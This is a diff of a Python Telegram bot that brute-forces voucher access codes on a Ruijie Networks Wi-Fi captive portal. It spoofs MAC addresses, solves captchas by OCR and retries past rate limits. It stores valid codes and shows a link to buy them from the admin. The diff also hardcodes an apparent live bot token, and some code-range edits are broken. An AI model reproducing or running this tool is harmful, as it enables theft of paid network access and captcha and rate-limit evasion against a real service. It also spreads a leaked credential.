@@ -14,7 +14,6 @@ from datetime import datetime, timedelta
 import os
 import sys
 import gc
-import itertools
 import nest_asyncio
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -27,13 +26,7 @@ MAX_CONCURRENT = 200
 CONNECTION_LIMIT = 200
 ADMIN_USERNAME = "gobiln07"
 ADMIN_URL = f"https://t.me/{ADMIN_USERNAME}"
-TOKEN = "8864755007:AAFgeXU_eJGVTnK_nb13NlIlzIblWiepgYg"
-
-# Proxy List
-PROXY_LIST = [
-    # "http://123.45.67.89:8080",
-]
-proxy_pool = itertools.cycle(PROXY_LIST) if PROXY_LIST else None
+TOKEN = "8864755007:AAFgeXU_eJGVTnK_nb13NlIlzIblWiepgYg"  # <── ဤနေရာတွင် BotFather မှ Token အမှန်ကို ပြန်စစ်၍ ထည့်ပါ
 
 # ── DATABASE SETUP ────────────────────────────────────────────────────────
 conn = sqlite3.connect('bot_database.db', check_same_thread=False)
@@ -82,22 +75,22 @@ def get_mac():
 def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
-async def get_session_id(session_obj, session_url, proxy=None, prev_sid=None):
+async def get_session_id(session_obj, session_url, prev_sid=None):
     mac = get_mac()
     url = replace_mac(session_url, new_mac=mac)
     headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'accept': 'text/html'}
     try:
-        async with session_obj.get(url, headers=headers, proxy=proxy, allow_redirects=True, timeout=5) as req:
+        async with session_obj.get(url, headers=headers, allow_redirects=True, timeout=5) as req:
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             return sid.group(1) if sid else prev_sid
     except:
         return prev_sid
 
-async def Captcha_Image(session_obj, session_id, proxy=None):
+async def Captcha_Image(session_obj, session_id):
     params = {'sessionId': session_id, '_t': str(time.time())}
     headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36'}
     try:
-        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, proxy=proxy, timeout=5) as req:
+        async with session_obj.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers, timeout=5) as req:
             return await req.read()
     except:
         return None
@@ -105,11 +98,11 @@ async def Captcha_Image(session_obj, session_id, proxy=None):
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
-async def Varify_Captcha(session_obj, session_id, text, proxy=None):
+async def Varify_Captcha(session_obj, session_id, text):
     json_data = {'sessionId': session_id, 'authCode': text}
     headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36', 'content-type': 'application/json'}
     try:
-        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, proxy=proxy, timeout=5) as req:
+        async with session_obj.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, timeout=5) as req:
             data = await req.json()
             return session_id if data.get("success") else None
     except:
@@ -156,12 +149,12 @@ def code_generator(mode):
         codes = [str(i).zfill(9) for i in range(1000000000)]
     elif mode == "alpha6":
         chars = string.ascii_lowercase
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(100000000)]
     elif mode == "mix6":
         chars = string.ascii_lowercase + string.digits
-        codes = [''.join(random.choices(chars, k=6)) for _ in range(300000)]
+        codes = [''.join(random.choices(chars, k=6)) for _ in range(500000000)]
     else:
-        codes = [str(i).zfill(6) for i in range(1000000)]
+        codes = [str(i).zfill(6) for i in range(10000000000000000)]
 
     random.shuffle(codes)
     for code in codes:
@@ -172,52 +165,51 @@ async def perform_check_silent(code, chat_obj, session_url, connector, context_d
     context_data['current_code'] = code
     post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
     session_id = None
-    timeout = aiohttp.ClientTimeout(total=8, connect=3)
-    
-    proxy = next(proxy_pool) if proxy_pool else None
+    timeout = aiohttp.ClientTimeout(total=10, connect=3)
 
     for _ in range(2):
         if context_data.get('scan_stop', False): return None
         try:
             async with aiohttp.ClientSession(connector=connector, connector_owner=False, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
                 if not session_id:
-                    session_id = await get_session_id(task_session, session_url, proxy=proxy)
+                    session_id = await get_session_id(task_session, session_url)
                     if not session_id:
                         context_data['expired'] += 1; return None
 
-                image = await Captcha_Image(task_session, session_id, proxy=proxy)
+                image = await Captcha_Image(task_session, session_id)
                 if not image:
                     context_data['expired'] += 1; return None
                 text = await Captcha_Text(image)
-                if not text or not await Varify_Captcha(task_session, session_id, text, proxy=proxy):
-                    context_data['expired'] += 1; continue
+                if not text or not await Varify_Captcha(task_session, session_id, text):
+                    context_data['expired'] += 1; return None
 
                 data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1, "authCode": text}
                 headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36", "content-type": "application/json"}
-                async with task_session.post(post_url, json=data, headers=headers, proxy=proxy, timeout=6) as req:
+                async with task_session.post(post_url, json=data, headers=headers, timeout=8) as req:
                     response = await req.text()
                     if 'request limited' in response:
-                        context_data['retry_total'] += 1; await asyncio.sleep(0.3); continue
-                    
-                    if 'logonUrl' in response or '"success":true' in response or 'auth success' in response:
+                        context_data['retry_total'] += 1; await asyncio.sleep(0.5); continue
+                    if 'logonUrl' in response or '"success":true' in response:
                         balance_info = await get_balance_info(session_id)
                         if balance_info:
                             balance_display, plan_name = balance_info
-                        else:
-                            balance_display, plan_name = "Active", "Voucher Plan"
-
-                        if not any(item['code'] == code for item in context_data['success_codes']):
-                            context_data['success_codes'].insert(0, {"code": code, "plan": plan_name, "balance": balance_display})
+                            context_data['success_codes'].append({"code": code, "plan": plan_name, "balance": balance_display})
                             context_data['hits'] += 1
 
                             user_id = chat_obj.id
                             async with db_lock:
                                 cursor.execute("INSERT INTO found_codes_db (user_id, code, plan, time_val) VALUES (?, ?, ?, ?)", (user_id, code, plan_name, balance_display))
                                 conn.commit()
-                        return True
-                    break
+
+                            buy_link = f"\n🛒 ဝယ်ယူရန်: [Admin @gobiln07]({ADMIN_URL})"
+                            try:
+                                await chat_obj.send_message(f"🎉 **HIT FOUND!**\nCode: `{code}`\nPlan: {plan_name}\nBalance: {balance_display}{buy_link}", parse_mode="Markdown", disable_web_page_preview=True)
+                            except:
+                                pass
+                            return True
+                    context_data['expired'] += 1; return None
         except:
-            continue
+            context_data['expired'] += 1; return None
     context_data['expired'] += 1
     return None
 
@@ -230,8 +222,6 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
     context.user_data['success_codes'] = []
     context.user_data['current_code'] = "000000"
 
-    start_time = time.time()
-    last_edit_time = 0
     connector = aiohttp.TCPConnector(limit=CONNECTION_LIMIT, ttl_dns_cache=300)
     code_gen = code_generator(mode)
 
@@ -255,49 +245,19 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
             if not tasks: break
 
             await asyncio.gather(*tasks)
-            await asyncio.sleep(0.01)
+            await asyncio.sleep(0.1)
             if context.user_data.get('scan_stop', False): break
-
-            current_time = time.time()
-            if current_time - last_edit_time < 1.0:
-                continue
-            last_edit_time = current_time
 
             checked_total = context.user_data.get('checked_total', 0)
             hits = context.user_data.get('hits', 0)
             expired = context.user_data.get('expired', 0)
-            retry_total = context.user_data.get('retry_total', 0)
             current_code = context.user_data.get('current_code', '000000')
 
-            elapsed_time = current_time - start_time
-            speed_cm = (checked_total / elapsed_time) * 60 if elapsed_time > 0 else 0
-            
-            proxy_count = len(PROXY_LIST) if PROXY_LIST else 0
-            proxy_status = f"-1/{proxy_count}" if proxy_count > 0 else "0/0"
-
-            recent_hits = context.user_data.get('success_codes', [])[:25]
-            hits_text = ""
-            if recent_hits:
-                hits_text = "\n💯 **Hit Codes:**\n" + "\n".join([f"`{h['code']}` 🎫 : {h['balance']}" for h in recent_hits])
-
-            text = (
-                f"𝐆𝐨𝐛𝐥𝐢𝐧 𝐜𝐨𝐝𝐞 𝐡𝐚𝐜𝐤\n"
-                f"{session_url}\n"
-                f" **Scanner Running** \n"
-                f" Tried: {checked_total:,}\n"
-                f" Current Code: {current_code}\n"
-                f" Hits: {hits}\n"
-                f" Expired: {expired}\n"
-                f" Limits: {retry_total}\n"
-                f" Speed: {speed_cm:.1f} c/m\n"
-                f" Proxies: {proxy_status}\n\n"
-                f"───────────────────────────────"
-                f"{hits_text}"
-            )
+            progress_pct = (checked_total / total_codes_count) * 100 if total_codes_count > 0 else 0
+            text = f"📊 **Scanning Progress...**\n- Progress: {progress_pct:.2f}%\n- Tried: {checked_total}/{total_codes_count}\n- Current: `{current_code}`\n- Hits: {hits}\n- Expired: {expired}"
             try:
                 await status_msg.edit_text(text, parse_mode="Markdown")
-            except: 
-                pass
+            except: pass
 
     except Exception as e:
         print(e)
@@ -307,7 +267,7 @@ async def run_scanner_background(query, session_url, mode, total_codes_count, co
         hits_count = context.user_data.get('hits', 0)
         checked_count = context.user_data.get('checked_total', 0)
         try:
-            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count:,}\nHits: {hits_count}")
+            await query.message.chat.send_message(f"✅ ပြီးဆုံးပါပြီ (သို့) ရပ်တန့်လိုက်ပါပြီ။\nစုစုပေါင်း စစ်ဆေးပြီးစီးမှု: {checked_count}\nHits: {hits_count}")
         except:
             pass
 
@@ -353,7 +313,7 @@ async def ask_code_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     context.user_data['waiting_for_code'] = True
-    await query.message.reply_text("🔑 ကျေးဇူးပြု၍ သင့်ထံတွင်ရှိသော Access Code ကို ဤချတ်ဘောက်စ်ထဲတွင် ရိုက်ထည့်ပေးပါရန်။", parse_mode="Markdown")
+    await query.message.reply_text("🔑 ကျေးဇူးပြု၍ သင့်ထံတွင်ရှိသော Access Code ကို ဤချတ်ဘောက်စ်ထဲတွင် ရိုက်ထည့်ပေးပါရန်。", parse_mode="Markdown")
 
 async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.message
@@ -488,8 +448,7 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    # Database မှ သိမ်းဆည်းထားသမျှ Codes အားလုံးကို ကန့်သတ်ချက်မရှိ ထုတ်ယူမည်
-    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC", (user_id,))
+    cursor.execute("SELECT code, plan, time_val FROM found_codes_db WHERE user_id = ? ORDER BY rowid DESC LIMIT 50", (user_id,))
     rows = cursor.fetchall()
 
     if not rows:
@@ -498,21 +457,15 @@ async def view_saved_codes(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else: await update.message.reply_text(msg)
         return
 
-    # Telegram စာသားအရှည် ကန့်သတ်ချက် (4096 characters) ရှိသောကြောင့် အပိုင်းလိုက် (Chunks) ခွဲထုတ်ပေးမည်
-    chunk_size = 50
-    for i in range(0, len(rows), chunk_size):
-        chunk = rows[i:i + chunk_size]
-        result_text = f"💎 **Saved Codes ({i+1} - {i+len(chunk)} / {len(rows)})**\n\n"
-        for idx, item in enumerate(chunk, i + 1):
-            result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"
-        
-        if query:
-            await query.message.reply_text(result_text, parse_mode="Markdown")
-        else:
-            await update.message.reply_text(result_text, parse_mode="Markdown")
+    result_text = f"💎 **Saved Codes (Latest {len(rows)})**\n\n"
+    for idx, item in enumerate(rows, 1):
+        result_text += f"{idx}. Code: `{item[0]}` | Plan: {item[1]} | Balance: {item[2]}\n"
 
     if query:
+        await query.message.reply_text(result_text, parse_mode="Markdown")
         await query.answer()
+    else:
+        await update.message.reply_text(result_text, parse_mode="Markdown")
 
 async def back_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
